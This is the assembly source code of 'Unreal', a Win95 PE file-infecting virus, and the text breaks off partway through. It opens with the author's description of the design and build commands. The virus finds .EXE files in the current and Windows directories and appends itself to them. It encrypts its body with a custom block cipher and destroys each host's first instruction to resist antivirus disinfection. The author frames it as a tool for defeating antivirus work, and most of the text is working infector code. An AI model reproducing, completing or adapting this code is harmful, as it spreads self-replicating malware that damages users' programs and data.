Win95.Unreal
Comment %
-----------------------------+       UNREAL       +--------------------
                             +----+ By Qozah +----+


-------+ Briefing +---------------------------------------------------------


  Unreal is a 3349 bytes long PE infector. It works on win9x systems by
  appending it's code to the last file section and modifying the header to
  do so - the so called 29A technique.

  It uses multithreading to perform it's infection; as it should waste time
  that could be noticed by the user, launches it's routines as a thread and
  jumps in the main thread to the legit code. Of course, it's possible
  that the main thread is closed before the program is, but even if the
  virus was infecting at that time nothing would happen; as it uses file
  mapping, changes will be saved only when all is finished. Anyway I've
  heard this idea was used before, but I also thought it didn't I ? :P

  Unreal is encrypted by QBCE ( Qozah's Block Cyphering Engine ), which
  is a block cypher deeply analyzed forward. In a few words, it
  makes 24 rounds of encryption with random operations on the code, making
  it a good algorithm for crypting.

  Now, maybe the best idea inside this one is that it's virtually
  uncleanable by normal methods, due to an engine I called UVE. I strongly
  recommend at least understanding the idea on it. Past is gone, we can't
  relay on it making the same things. Technology has to strenghten, and new
  ideas to fuck up antivirus's work should be taken as a standard. This is
  a good example.


  Descriptions on QBCE and UVE follow.



-------+ Qozah's Block Cyphering Engine +-----------------------------------

   Basic operations
   ----------------

  The engine selects randomly a bunch of 24 rounds which will work in all
  the bytes of the encrypted file ( this value can be changed )

  That values are 10 bits long, and look this way:

           +-+-+-+-+-+-+-+-+-+-+
           | | | | | | | | | | |
           +-+-+-+-+-+-+-+-+-+-+
            ^   ^
            |   |
         Select |
                |
              Argument

  The cipher works with three basic operations: ADD, SUB, XOR, ROR and ROL.
  So, the meanings of Select are:

   00      ADD
   01      SUB
   10      XOR
   11      ROR/ROL

  When there is a ROR or a ROL the cipher looks at the next bit; a 0 means
  ROR, and a 1 means ROL. These operations are obviously the ones to decrypt
  the code, as the encryption will set them up. The value stored in the
  Argument part which is 8 bits long except in ROL and ROR where it's just
  7 bits: nothing to fear, as it won't be very interesting to make a more
  than 31 times rotation.

  The table where this is stored is 31 bytes long, which is enough to
  perform 24 operations ( 24*10 = 240 bits, 240/8 = 30 bytes ). The other
  byte is used when messing up two 32 bit blocks.


   Block ciphering
   ---------------

  The engine doesn't just crypt the code with that bunch of operations.
  Looking at the complete length ( which is stored in 16 bits with a maximum
  of 64Kb - keep an eye if you want to make it take bigger stuff ), it
  divides the code in 64-bit blocks this way:

   +---------+---------+---------+-----+
   |         |         |         |     |
   +---------+---------+---------+-----+
     64-bits   64-bits   64-bits  Last block ( undefined )

  It will start cyphering 32-bit bunchs on each block, then operating
  among any of the 2 bunchs of each block, and finally modifying the
  last block. When the engine starts working, it divides the 64 bit block
  in two dwords ( 32-bit each ). Loads the first of them and makes 24
  operations byte to byte, going later with the other block:


   Cyphering 32 bits
   -----------------
  Let's suppose the dword is in EAX:

  The first byte ( in xL ) is encrypted with the first operation, then
  it's value is stored, the 32-bit register for it rotated right 8 bits,
  and the same operation that was applied to it is made to the next byte;
  the argument will be the encrypted byte. So the rotated byte in xL is
  processed the same way:

  In this example, the first operation will be "ADD AL,4Ch", and the
  second will be "ROR AL,5h"


       Original state                              First operation
                                                                +4C
   +----+----+----+----+                        +----+----+----+----+
   | 1A | F0 | D1 | 43 |                        | 1A | F0 | D1 | 8F |
   +----+----+----+----+                        +----+----+----+----+

 ROL EAX,8d ( to work with next byte )             Second operation
                                                                ROR 5h
   +----+----+----+----+                        +----+----+----+----+
   | 8F | 1A | F0 | D1 |                        | 8F | 1A | F0 | D1 |
   +----+----+----+----+                        +----+----+----+----+

  Then, it will make that second operation to the byte "1Ah" and so on,
  in it's 24 rounds, using of course 24 different operations ( so each
  byte is changed 24/4*2 = 12 times )

  When two 32-bit bunchs are finished, they will be stored: for
  decryption, the engine works backwards: first AL is operated, then
  rotated left and operated again with the same op, the next one is
  done to the same AL, and so on.


  Block messing
  -------------
  When two 32 bit blocks are done, the first one is re-encrypted by the
  second using up to four operations stored in a single byte that can be
  either ADD or XOR in different ways, taking the other block as argument.
  That byte is stored this way:

   00      ADD ( the other block )
   01      ADD ( rotating the other block )
   10      XOR ( with the other block )
   11      XOR ( with the other block rotated )

  So you can see the first bit tells us if we should rotate or not the
  block: when decrypting, this will be the first to execute instead
  of the bunch-cyphering doing first the rotation op ( which is done the
  last when encrypting )

  Last block
  ----------
  As you should have noticed, the last block won't probably be 64-bit
  long. So, this unfixed length block is handled in a different way. If we
  can take 32 bits from it, they will be done as a normal 32-bit block as
  before.

  The other block won't be even touched: it's highly recommended not to
  place anything important there or anything we should be recognized for:
  it's not any big waste, as the bigger number of bytes that can be
  outside blocks and non-encrypted is 3.

  So, place three fake bytes in the end of the encrypted code, and even
  fill 'em with shit: the engine will ignore them.



-------+ Uncleanable Virus Engine +-----------------------------------------

  The UVE is an idea performed after making my article about polymorphism,
  and how it can always be detectable. Thinking on alphabets and languages,
  a poly engine cannot be undetected, but a file infected by a virus can be
  made uncleanable.

  That's the idea behind this engine, making it impossible to remove the
  virus from a file, at least by a normal procedure. You could make this
  idea bigger supporting many instructions, but that's not my point. Be it
  one instruction as in my engine, or X instructions, the important
  objective is accomplished. I've received some complaints because most
  files didn't begin by mov reg,imm32. But the main objective on uncleanable
  making is made: confussion, and not knowing if the instruction was or
  wasn't in the beggining of the file.

  I'll describe it in 5 points:

  <li> First of all, check if the first instruction of the legit code, the one
  on the entry point, is a mov reg,imm32.

  <li> In the beggining of the virus code, place that mov reg,imm32 if it
  exists, and another 6 mov reg,imm32 instructions which use random
  registers and random value assignations - not using esp or the one the
  legit instruction uses.

  <li> If there's no mov reg,imm32 instruction in the beggining of the legit
  code, the engine will anyway generate 7 random mov reg,imm32 instructions
  at the beggining of the virus.

  <li> The legit code instruction 'mov reg,imm32' is overwritten with 0s, and
  the old entry point is added 5.

  <li> When the .exe is run, these 7 instructions are executed, then registers
  are pushed onto the stack, and when returning to original host, they're
  replaced. So, an antivirus can't know if there was a 'mov reg,imm32' in
  the beggining of the original host code, or which one was it, so it
  can't replace it.



-------+ Greetings +--------------------------------------------------------

  Special greetings in this virus go to:

  Billy Belcebu -> For the idea on getting the Kernel32.DLL address: kewl.
 And thanks for letting me publish in your magazine.
  Sopinky -> For all yer support man
  Z0mbie -> Cool ideas, how do u have tha time ? Ya rule, thanx for help
  Benny -> Need to hear from yer projects

-------+ Contact +----------------------------------------------------------

  E-mail me at qozah@hax0r.com.ar

-------+ Compilation +------------------------------------------------------

  tasm32 -ml -m5 -q -zn unreal.asm
  tlink32 -v -Tpe -c -x -aa unreal,,, import32
  pewrsec unreal.exe
  remove unreal.exe after the first infection when executing files in the
same directory (tasm bug makes own infection a fuckup)


---------------------------?-------------?----------------------------------
%

.486p
.model  flat

NULL                            EQU     00000000h
MB_ICONEXCLAMATION              EQU     00000030h

extrn       ExitProcess: proc
extrn       GetModuleHandleA: proc
extrn       GetProcAddress: proc
extrn       MessageBoxA: proc


.data

    db  ?

.code

v_start     label   byte

Start:
                db      35d dup (90h)   ; Place set for 7 instructions.
                pusha
                call    Get_Delta       ; Get Delta Offset
Get_Delta:
                mov     esi,esp
                add     dword ptr [esi],Real_start-Get_Delta
                push    esi
                lodsd
                sub     eax,offset Real_start
                mov     ebp,eax
                pop     dword ptr [Find_Win32_Data+ebp]
                push    dword ptr [ebp+dif_point2]
                pop     dword ptr [ebp+dif_point]
                call    external_first_gen_ops

external_address    equ $-4

                ret

EncStart        label   byte


; Other Data

number_bytes:   dd  0
Search_File:    db  '*.EXE',0
GetMHandle:     dd  0
Azathoth:       db  'Unreal virus written by Qozah',0

                db  'So how are you going to clean this one, AV guys ?',0
                db  'It''s your turn, to tell the people that buy your '
                db  'shit that you cannot disinfect this one without '
                db  'risking their data ',0

;   API adresses

API_Adresses:
API_Create:     dd  0
API_Close:      dd  0
API_FindFirst:  dd  0
API_FindNext:   dd  0
API_CMap:       dd  0
API_MapView:    dd  0
API_Unmap:      dd  0
API_Pointer:    dd  0
API_SetEnd:     dd  0
API_ExitThread: dd  0
API_CrThread:   dd  0
API_GetWDir:    dd  0
API_SetDir:     dd  0
API_GetTime:    dd  0


Real_start:

;   Get all the APIs we'll need in the virus

                lea     esi,[API_Reference+ebp]    ; Initialize
                lea     ebx,[API_Names+ebp]
                lea     edi,[API_Adresses+ebp]
                mov     ecx,API_Quantity
Get_APIs:
                push    ecx
                xor     eax,eax
                lodsb
                add     ebx,eax
                push    ebx
                push    dword ptr [GetMHandle+ebp]
                call    GetProcAddress
GPAddress       equ     $-4
                stosd                       ; Save address
                pop     ecx
                loop    Get_APIs

;
; lpThreadAttributes;dwStackSize;lpStartADress,lPParameter,
;dwCreationFlags, lpThreadld

                lea     eax,[THR+ebp]
                push    eax
                push    0 0
                lea     eax,[FindFirstFile+ebp]
                push    eax
                push    1000d 0
                mov     eax,dword ptr [API_CrThread+ebp]
                call    eax

                jmp     ReturnHost
THR:            dd      0
;epflag:         db      0

;----------------------
; FindFirst "Host.EXE"
FindFirstFile:
                call    Delta4thread
Delta4thread:
                pop     ebp
                sub     ebp,offset Delta4thread
                mov     byte ptr ds:[signal+ebp],01d

FindFirstReal:
                lea     eax,[Find_Win32_Data+ebp]
                push    eax
                lea     eax,[Search_File+ebp]
                push    eax
                mov     eax,dword ptr [API_FindFirst+ebp]
                call    eax

                or      eax,eax
                jz      EndReturn
                push    eax
                call    Infect

LoopFindNext:
                pop     ebx                 ; Handle for finding
                push    ebx
                call    FindNext
                or      eax,eax
                pop     eax
                jz      EndReturn
                push    eax
                call    Infect
                jmp     LoopFindNext



WinDir:         db      MAX_PATH dup (90h)
signal:         db      01h
                ; We finished, so we just get out

;#########################################################################
;               We should now infect the windows directory
;#########################################################################

EndReturn:

                ; We change directory ( now it's windows one )

                push    MAX_PATH
                lea     eax,[WinDir+ebp]
                push    eax
                mov     eax,dword ptr [API_GetWDir+ebp]
                call    eax

                lea     eax,[WinDir+ebp]
                push    eax
                mov     eax,dword ptr [API_SetDir+ebp]
                call    eax

                dec     byte ptr ds:[signal+ebp]
                mov     al,byte ptr ds:[signal+ebp]
                or      al,al
                jz      FindFirstReal

ExitGame:

                push    NULL
                mov     eax,dword ptr [API_ExitThread+ebp]
                call    eax


                ; FINISH




FindNext:

                lea     eax,[Find_Win32_Data+ebp]
                push    eax
                push    ebx
                mov     eax,dword ptr [API_FindNext+ebp]
                call    eax
                ret

Infect:

; Open "Host.EXE"

                push    0 0 3 0 1 0C0000000h  ; Read/Write access
                lea     eax, [Find_Win32_Data+WFD_szFileName+ebp]
                push    eax
                mov     eax, dword ptr [API_Create+ebp]
                call    eax


                mov     ebx,eax
                inc     eax
                jnz     No_Prob1
                ret
No_Prob1:
                push    ebx                 ;also for open_mapping

; CreateFileMapping

                mov     edi,dword ptr [Find_Win32_Data+WFD_nFileSizeLow+ebp]
                add     edi,virus_size      ; Host plus our size
                push    0
                push    edi
                push    0
                push    PAGE_READWRITE      ; R/W
                push    0                   ; Opt_sec_attr
                push    ebx                 ; Handle
                mov     eax, dword ptr [API_CMap+ebp]
                call    eax
                push    eax                 ; Save mapping handle
                or      eax,eax
                jnz     No_Prob2
                ret

badress:        dd      0

No_Prob2:

; MapViewOfFile

                push    edi
                push    0
                push    0
                push    FILE_MAP_ALL_ACCESS
                push    eax                 ; handle
                lea     eax,dword ptr [API_MapView+ebp]
                call    dword ptr [eax]

                or      eax,eax
                jz      Close_handles             ; Does it (???)
                push    eax
                mov     edx,eax
                mov     dword ptr ds:[badress+ebp],eax
                ; Base address = eax


;///////////////////////////////////////////////////////////////////////////
;                      File mapped, infection begins
;///////////////////////////////////////////////////////////////////////////


                movzx   ebx, word ptr ds:[eax]
                add     bh,bl
                add     bh,-('M'+'Z')
                jnz     unmap_close

                mov     bx,word ptr ds:[eax+03ch]
                add     edx,ebx                     ; PE header

                mov     bx,word ptr ds:[edx]
                xor     bx,0baafh                  ; Is PE header ?
                inc     bx
                jnz     unmap_close
                or      word ptr ds:[0014h+edx],0 ; Optional header exists ?
                jz      unmap_close

                mov     eax,dword ptr ds:[04ch+edx]
                add     eax,-'CHR0'
                jz      unmap_close

                mov     ax,word ptr ds:[016h+edx]   ; File is executable
                and     ax,0002h
                jz      unmap_close

                ; So, we have a suitable file for infection
                ; Now then calculate beggining of last section

                mov     esi,edx
                add     esi,18h
                mov     bx,word ptr ds:[edx+14h]         ; SizeofOptional
                add     esi,ebx                ; Start of Section Table

                ; Now that esi = section table, we must search
                ;which is the last one: that is, looking at the biggest
                ;PointerToRawData field.

                push    esi
                movzx   ecx,word ptr ds:[edx+06h]   ; number of sections
                mov     edi,esi
                xor     eax,eax
                push    cx
X_Sections:

                pushad
                mov     ebx,esi
                mov     eax,dword ptr ds:[edx+02Ch] ; Get the code RVA
                cmp     dword ptr ds:[edi+0Ch],eax ; Are they the same ?
                jnz     fuckya
                mov     esi,dword ptr ds:[edx+028h] ; Substract Entry Point RVA to Code base
                sub     esi,eax
                add     esi,dword ptr ds:[ebx+014h]
                add     esi,dword ptr ds:[badress+ebp]
                lea     edi,Start+ebp
                push    eax ebx ecx edx esi edi ebp
                call    UVE
                pop     ebp edi esi edx ecx ebx eax
                jc      fuckya
                ; Overwrite old instructions with 0s
                mov     dword ptr ds:[esi],0h
                mov     byte ptr ds:[esi+4d],0h
                ; Activate flag: old ep has to be increased by 5
                add     dword ptr ds:[edx+028h],5d
fuckya:
                popad


                cmp     dword ptr [edi+14h],eax
                jz      Not_Biggest
                mov     ebx,ecx
                mov     eax,dword ptr [edi+14h]
Not_Biggest:
                add     edi,28h
                loop    X_Sections
                pop     cx                          ; number of sections
                sub     ecx,ebx         ; calculate last one

                mov     eax,028h
                push    edx
                mul     ecx
                pop     edx
                add     esi,eax

                ; We've got the last section in the section table just
                ;in esi ( while PE header is still in edx )
                ; So first we set it to writable, code and executable
                ;( also, we discard it if it contains useless data, as
                ;.reloc has )

                or      dword ptr ds:[esi+24h],0A0000020h

                ; Now we save SizeOfRawData, add our size to the Virtual
                ;size, to put the real size of the section now.

                mov     edi,dword ptr ds:[esi+10h]
                mov     eax,virus_size
                xadd    dword ptr ds:[esi+8h],eax ; VirtualSize
                push    eax
                add     eax,virus_size

                ; As eax holds the new virtual size, we have probably
                ;fucked the alignment. So we get it and divide the new
                ;VirtualSize by the alignment: the result of the new
                ;SizeOfRawData is just the quotient multiplied by the
                ;Alignment

                push    edx
                mov     ecx, dword ptr ds:[edx+03ch]
                xor     edx,edx
                div     ecx         ; eax holds virtual size
                xor     edx,edx
                inc     eax
                mul     ecx         ; file align x number of bunchs
                mov     ecx,eax
                mov     dword ptr ds:[esi+10h],ecx
                pop     edx

                ; Now the NewSizeOfRawData is calculated and stored. So
                ;what's now ? We add that place the VirtualAddress stored
                ;in offset 0ch... and so we get the new entry point for
                ;the virus: that VirtualAddress ( where it's loaded in
                ;memory ) plus the offset where the virus is at, makes
                ;our entry point.

                pop     ebx         ; This is VirtualSize - virus_size
                add     ebx,dword ptr ds:[esi+0ch]    ; section RVA
                mov     eax,dword ptr ds:[edx+028h]   ; Old entry point
                mov     dword ptr ds:[dif_point2+ebp],ebx

no_ep_mod:

                sub     dword ptr ds:[dif_point2+ebp],eax
                mov     dword ptr ds:[edx+28h],ebx

                ; Then, we calculate how much more data we have...
                ;and so we store it in SizeOfImage ( of course, it's
                ;this rounded one as it have to be aligned...

                sub     ecx,edi
                add     dword ptr ds:[edx+50h],ecx ; add to SizeOfImage
                mov     dword ptr ds:[edx+04ch],'CHR0'

                ; EAX = OLD EP
                ; EBX = NEW EP


                ; Now to finish infection, the whole virus is copied
                ;to the file.

                pop     ebx

                pop     edi
                push    edi
                add     edi,dword ptr ds:[esi+14h]
                add     edi,dword ptr ds:[esi+8h]
                sub     edi,virus_size
                lea     esi,[ebp+v_start]
                mov     ecx,virus_size

                pushad
                call    Infection_cryption
                popad

                mov     edi,0bff70000h

; Close and go

unmap_close:
                lea     eax,dword ptr [API_Unmap+ebp]
                call    dword ptr [eax]
Close_handles:
                lea     eax, [API_Close+ebp]
                call    dword ptr [eax]

                add     edi,-0bff70000h
                jz      Cool_infected

                ; If we had any problems, we have to set the old
                ;file length so it doesn't grow

                pop     ebx             ; File handle
                push    0 0
                push    dword ptr [Find_Win32_Data+WFD_nFileSizeLow+ebp]
                push    ebx
                lea     eax, [API_Pointer+ebp]
                call    dword ptr [eax]

                push    ebx
                lea     eax, [API_SetEnd+ebp]
                call    dword ptr [eax]
                push    ebx

Cool_infected:
                lea     eax, [API_Close+ebp]
                call    dword ptr [eax]
                ret

API_Reference:

                db      0d,12d,12d,15d,14d,19d,14d,16d,15d,13d,11d
                db      13d,21d,21d

End_Reference   label   byte

API_Quantity    equ     End_Reference-API_Reference

;   API names

API_Names:
                db  'CreateFileA',0
                db  'CloseHandle',0
                db  'FindFirstFileA',0
                db  'FindNextFileA',0
                db  'CreateFileMappingA',0
                db  'MapViewOfFile',0
                db  'UnmapViewOfFile',0
                db  'SetFilePointer',0
                db  'SetEndOfFile',0
                db  'ExitThread',0
                db  'CreateThread',0
                db  'GetWindowsDirectoryA',0
                db  'SetCurrentDirectoryA',0
                db  'GetSystemTime',0

;
;   GETTING GETMODULEHANDLE AND GETPROCADDRESS

; Here we look at the GetModuleHandle and GetProcAddress addreses in
;memory so that we can use all the APIs in the virus.
;

GetModuleHandleProcAddress:

    ; This method on getting the Kernel32.dll address was suggested by Billy
    ;Belcebu so I must give him some greetings ;). As a program is
    ;consecuence of a CreateProcess call, place in kernel from where it
    ;was called is still in the stack; so we substract from it again and
    ;again till we find the real header.

                mov     edi,esp
                mov     edi,[edi+02Ch]
                and     edi,0FFFF0000h
CheckAgain:
                sub     edi,10000h
                mov     ax,word ptr ds:[edi]
                add     ax,-'ZM'
                jnz     CheckAgain

    ; So we've got the kernel just right here.

                mov     edx,dword ptr ds:[edi+03ch]
                add     edx,edi

                mov     ebx,dword ptr ds:[edx+78h]
                add     ebx,edi


                mov     esi,dword ptr ds:[ebx+20h]  ; AddressOfNames
                add     esi,edi                     ; + base address of K32
                xor     ecx,ecx

Find_GPA:
                inc     ecx
                lodsd                               ; Pointer to name
                mov     edx,eax
                add     edx,edi                     ; Name in edx
                cmp     dword ptr ds:[edx],'PteG'
                jnz     Find_GPA
                cmp     dword ptr ds:[edx+5h],'dAco'
                jnz     Find_GPA
ProcFound:
                ; ecx handles where we found it.

                dec     ecx
                rol     ecx,1h
                mov     esi,dword ptr ds:[ebx+24h]  ; Address of ordinals
                add     esi,edi
                add     esi,ecx
                xor     eax,eax
                lodsw                               ; EAX = ordinal numbah

                mov     esi,dword ptr ds:[ebx+01ch]
                add     esi,edi
                rol     eax,2h                      ; *4h
                add     esi,eax
                lodsd

                add     eax,edi                     ; Adjust to base
                                                    ; Absolute address here
                mov     esi,ebp
                add     esi,(offset GPAddress-offset v_start)+401004h
                sub     eax,esi
                mov     dword ptr ds:[GPAddress+ebp],eax  ; Set addr
                mov     dword ptr [GetMHandle+ebp],edi ; Set Base

                ; So we stored GetProcAddress place

                ret

;GPName:         db 'GetProcAddress'


returnway:   dd      0


;   Internal text


image_base:     dd      0

;   Structures

Find_Win32_Data:
                db      SIZEOF_WIN32_FIND_DATA dup (90h)

EncEnd          label   byte
EncLength       equ     EncEnd-EncStart

;/*************************************************************************/
;   Here is where virus decryption is perfomed after the 1st generation.
;/*************************************************************************/

ReturnHost:
                push    cs
                pop     word ptr ds:[ebp+offset seg]
                mov     eax,ebp
                add     eax,offset v_start
                sub     eax,12345678h
dif_point       equ     $-4
                push    eax
                pop     dword ptr ds:[ebp+offset dif_p3]

                popad
                db      0eah
dif_p3:         dd      0
seg:            dw      0
dif_point2      dd      - (offset First_out - offset v_start)



Infection_cryption:

pushf
pushad
                lea     esi,dword ptr [EncStart+ebp]
                mov     ecx,EncLength
                call    Encrypt
popad
popf
                rep     movsb
pushf
pushad
                lea     esi,dword ptr [EncStart+ebp]
                mov     ecx,EncLength
                call    Decrypt
popad
popf
                ret


Decryption:

pushf
pushad
                lea     esi,dword ptr [EncStart+ebp]
                mov     ecx,EncLength
                call    Decrypt
popad
popf



                call    GetModuleHandleProcAddress

                ret


;============================================================================
;                        UNCLEANABLE VIRUS ENGINE
;============================================================================

            ; if CF is set, no mov ?s:reg32,imm32 was found, but it was
            ;generated anyway.

; UVE: Engine parameters:
;
;       ESI: Offset where the first instruction is red from.
;       EDI: Offset where the code has to be written to
;

Instruction:
            db      0bbh,12h,00h,00h      ; mov ebx, 12h
            db      0,0,0,0

;=========================*******************===============================
;                          INSTRUCTION CHECK
;=========================*******************===============================


GetFirstInstruction:
            push    edi
            lea     edi,Instruction+ebp
GetInstructionTrue:
            lodsb

            ; First of all, check if there is a prefix

            cmp     al,0b8h
            jb      No_Shit         ; This means no suitable instruction. So,
            cmp     al,0c0h         ;we just don't care but generate fake
            jae     No_Shit         ;instructions :)
            ; Go then to real instructions

MovRegImm:
            dec     esi
            mov     ecx,5
            rep     movsb           ; Copy to our instruction buffer
            pop     edi
            mov     ecx,5
            ret

No_Shit:
            ; Well, there's no instruction. So, we must generate a fake one
            ;to act as if it was legit in our code, then AVers mustn't know
            ;even if I supressed any.

            pop     edi
            mov     eax,7           ; Times to do it
faker_nf:
            mov     ecx,5           ; Length of instruction
            push    eax
            call    PrintFake
            pop     eax
            dec     eax
            jnz     faker_nf
            stc
            pop     ecx             ; Adjust stack
            jmp     Ended_Stuff

;=========================*******************===============================
;                             MARK OPCODE
;=========================*******************===============================
;
; MarkOpcode: with the first instruction at hand, this function determines
;which opcode is affected by it. After that, it stores a value in the
;correct marker.

                ;   EDI  ESI  EBP  ESP  EBX  EDX  ECX  EAX
Marker:     db      00010000b
MarkOpcode:

                ; In case it's b8h-bfh
Opcode_Prefix:
            lea     esi,Instruction+ebp
            xor     eax,eax
            lodsb
            sub     al,0b8h
;            add     al,24d
            bts     dword ptr ds:[Marker+ebp],eax
            ret

;=========================*******************===============================
;                             RANDOM SEED
;=========================*******************===============================

; GetRandomSeed/GetRandomNumber: Randomize functions.

GetRandomSeed:

            lea     eax,[TimeKindOf+ebp]
            push    eax
            lea     eax, [API_GetTime+ebp]
            call    dword ptr ds:[eax]
            ret

GetRandomNumber:

            push    ecx
            mov     ax,word ptr ds:[Miliseconds+ebp]
            xor     ax,1264h
         RndVal equ $-2
            mov     cx,ax
            add     ax,word ptr ds:[Second+ebp]
            xor     ax,word ptr ds:[Miliseconds+ebp]
            rol     ax,1
            add     cx,ax
            xor     word ptr ds:[RndVal+ebp],ax
            ror     ax,7d
            add     ax,cx
            add     ax,word ptr ds:[Miliseconds+ebp]
            rol     ax,4d
            xor     cx,ax
            sub     ax,word ptr ds:[RndVal+ebp]
            ror     ax,3d
            add     word ptr ds:[RndVal+ebp],ax
            mov     word ptr ds:[Miliseconds+ebp],ax
            add     ax,cx
            rol     ax,11d
            pop     ecx
            ret

;=====================***************************===========================
;                           PRINT LEGIT/FAKE
;=====================***************************===========================

secondary_buffer: db 5 dup(90h)

PrintLegit:                     ; The legit instruction
            push    ecx
            lea     esi,Instruction+ebp
            rep     movsb
            pop     ecx
            ret


PrintFake:                      ; A random one
            call    GetRandomNumber
            and     ax,0007h
            push    eax
            mov     dx,08d
            sub     dx,ax       ; Get reserved
            bt      dword ptr ds:[Marker+ebp],edx
            pop     edx

            jc      PrintFake          ; Is it reserved ?


            lea     esi,secondary_buffer+1+ebp
            mov     ecx,5

            ; Now the fake instructions has to be printed. It's with the same
            ;value of the legit one, so we must change that value.

            push    esi
            push    ecx
            add     esi,ebp     ; Now base pointer adjusts
            mov     ecx,12h
stvalue:
            call    GetRandomNumber
            add     word ptr [esi], ax
            sub     word ptr [esi+2], ax
            add     ax,word ptr [esi+2]
            xor     word ptr [esi],ax
            xor     ax,word ptr [esi+2]
            xor     word ptr [esi],ax
            add     word ptr [esi+2],ax
            loop    stvalue
            pop     ecx
            pop     esi


            ; This can be enough. Now let's just copy it to our buffer.

            dec     ecx
            mov     al,0b8h
            add     al,dl
            stosb
            rep     movsb

            ret

;=====================***************************===========================
;                        GENERATE INSTRUCTIONS
;=====================***************************===========================
; GenerateInstructions: this one will create instructions similar to the
;legit one, putting them into BufferInst. It will also put the legit one
;randomly among them.



GenerateInstructions:                   ; ecx is equal the number of opcodes
            mov     byte ptr ds:[Generated+ebp],0
            mov     esi,7
GenInstrAgain:
            call    GetRandomNumber
            and     ah,101b
            jz      LegGenerate
FakeIns:
            push    ecx esi
            call    PrintFake
            pop     esi ecx
            jmp     OneLess
LegGenerate:
            cmp     byte ptr ds:[Generated+ebp],1
            jz      FakeIns

            push    esi
            call    PrintLegit
            pop     esi
            mov     byte ptr ds:[Generated+ebp],1
OneLess:
            dec     esi
            jnz     GenInstrAgain
            mov     al,byte ptr ds:[Generated+ebp]
            dec     al
            jz      FinishedGenerating
            sub     edi,5
            inc     esi
            jmp     LegGenerate
FinishedGenerating:
            ret



;=====================***************************===========================
;                         MAIN FUNCTION/DATA
;=====================***************************===========================
; GenerateInstructions: this one will create instructions similar to the
;legit one, putting them into BufferInst. It will also put the legit one
;randomly among them.

Generated:  db      0

UVE:

            call    GetRandomSeed
            call    GetFirstInstruction
            call    MarkOpcode

            push    edi
            lea     esi,Instruction+ebp
            lea     edi,secondary_buffer+ebp
            movsd
            movsb
            pop     edi

            call    GenerateInstructions
            clc
Ended_Stuff:
            ret



TimeKindOf:
            dw      0,0,0,0,0
Minute      dw      0
Second      dw      0
Miliseconds dw      0



InstToRead:
            db      000h,12h,00h,00h      ; mov ebx, 12h
            db      0,0,0,0   ; 64 en 04




;===========================&&&&&&&&&&&&&&&&&&&==============================
;                     QOZAH'S BLOCK CYPHERING ENGINE
;===========================&&&&&&&&&&&&&&&&&&&==============================

;---------------------------------------------------------------------------

Create_Table:
            push    ecx
            mov     ecx,31d                 ; Create 31 bytes
            lea     edi,OperationTable+ebp
SixLoops:
            call    GetRandomNumber
            stosb
            loop    SixLoops
            pop     ecx
            ret

;---------------------------------------------------------------------------

GetBlocksReminder:
            xor     dx,dx
            mov     ax,08d
            xchg    ax,cx
            div     cx                  ; CX=number of blocks, DX=Remainder
            mov     cx,ax
            ret

;---------------------------------------------------------------------------

EncryptBlock:                           ; ESI is supposed begin crypt offset
                                        ;while EAX is the shit to crypt
            push    ecx
            lea     edi,OperationTable+ebp
            xor     ebx,ebx
;            lodsd

            mov     ecx,24d
MakeRound:
            mov     dword ptr [EncryptOperation+ebp],90909090h
            push    ecx
            mov     ecx,8d          ; Value to load ( 8 bits )

       ; 34h XOR, 2CH SUB, 04h ADD, C0h C8h ROL, c0h c0h ROR

            bt      [edi],ebx
            jc      XorOrRox
            inc     ebx
            mov     byte ptr [EncryptOperation+ebp],04h   ; ADD AL,XX
            bt      [edi],ebx
            jc      SubInst
            add     byte ptr [EncryptOperation+ebp],028h  ; SUB AL,XX
SubInst:    jmp     OpCodeStoredA

XorOrRox:
            inc     ebx
            bt      [edi],ebx
            jnc     DealWithXor

RorOrXor:
            inc     ebx
            bt      [edi],ebx
            mov     word ptr [EncryptOperation+ebp],0c0c0h ; ROL AL,XX
            jnc     MakeRol         ; IT'S MADE THE 'OTHER' WAY
            add     byte ptr [EncryptOperation+ebp+1],08h  ; ROL AL,XX
MakeRol:
            dec     cx
                            ; Ecx equ value to load, that is 7 bits for you
            jmp     OpCodeStoredA


DealWithXor:mov     byte ptr [EncryptOperation+ebp],034h ; XOR AL,XX

OpCodeStoredA:              ; Now it's time to obtain the cypher

            xor     edx,edx ; DX=0, DL=value to make operation

MakeValuesForOperation:
            inc     ebx             ; points to +2 or +3 in the beggining
            rol     dl,1
            bt      [edi],ebx
            jnc     NoOperand
            inc     dl
NoOperand:
            loop    MakeValuesForOperation
            cmp     byte ptr [EncryptOperation+1+ebp],90h
            jz      Type1
            mov     byte ptr [EncryptOperation+2+ebp],dl
            jmp     EncryptOperation
Type1:
            mov     byte ptr [EncryptOperation+1+ebp],dl
            db      0ebh,00h                    ; Avoid prefetch

                    ; One instruction made ( out of 4 )

EncryptOperation:
            db      90,90,90,90   ; work in AL. One byte excess to fit dword
            ror     eax,8d        ; Next byte this way ->

            mov     esi,dword ptr ds:[EncryptOperation+ebp]
            mov     dword ptr ds:[SecondCryptA+ebp],esi
SecondCryptA:
            db      90,90,90,90   ; work in AL. One byte excess to fit dword


            pop     ecx
            dec     ecx
            jz      FinishedCryptBlock
            jmp     MakeRound     ; 24 times ( 24 encryptions in 4 blocks )
FinishedCryptBlock:
            ror     eax,8d        ; Adjust last one.

            pop     ecx
            ret

;---------------------------------------------------------------------------

Get_some_for_offset:
            bt      [edi],ebx
            inc     ebx
            jnc     DontAddDl
            inc     dl
DontAddDl:  rol     dl,1
            loop    Get_some_for_offset
            ret

;---------------------------------------------------------------------------


GetDl:

            push    ebx
            pop     esi

            ; First of all, we get seven bits from the beggining of the
            ;table, that is, the offset relative to the table in bits
            ;to get our value.

            xor     edx,edx
            lea     edi,OperationTable+ebp
            xor     ebx,ebx

            mov     ecx,7d
            call    Get_some_for_offset

            mov     ebx,edx

            ; Now we have the desired offset so that we just get another
            ;value ( this time 5 bits ), which we will always use to
            ;operate.

            xor     edx,edx

            mov     ecx,5d
            call    Get_some_for_offset

            ret


;---------------------------------------------------------------------------

MessTwoBlocks:

            push    ecx esi

            call    GetDl

            ; This value will be from now stored in edl then. Now we
            ;start checking the table.

            mov     ebx,0d8h        ; beggining of that last 8 bits,
                                    ;as cfh is the beginning of the
                                    ;last operation
            mov     ecx,04h
Test_Rotate:
            push    ecx

            bt      [edi],ebx
            jnc     We_Dont_Rotate

            ; If we do rotate, we do it now, with dl value

            mov     byte ptr [DlHere+ebp],dl

            db      0ebh,00h
            db      0c1h,0c0h
DlHere:     db      ?


            ; Rotated or not, the second bunch is still in EAX, while
            ;the first one is in ESI. So, we test the second byte.

We_Dont_Rotate:

            inc     ebx
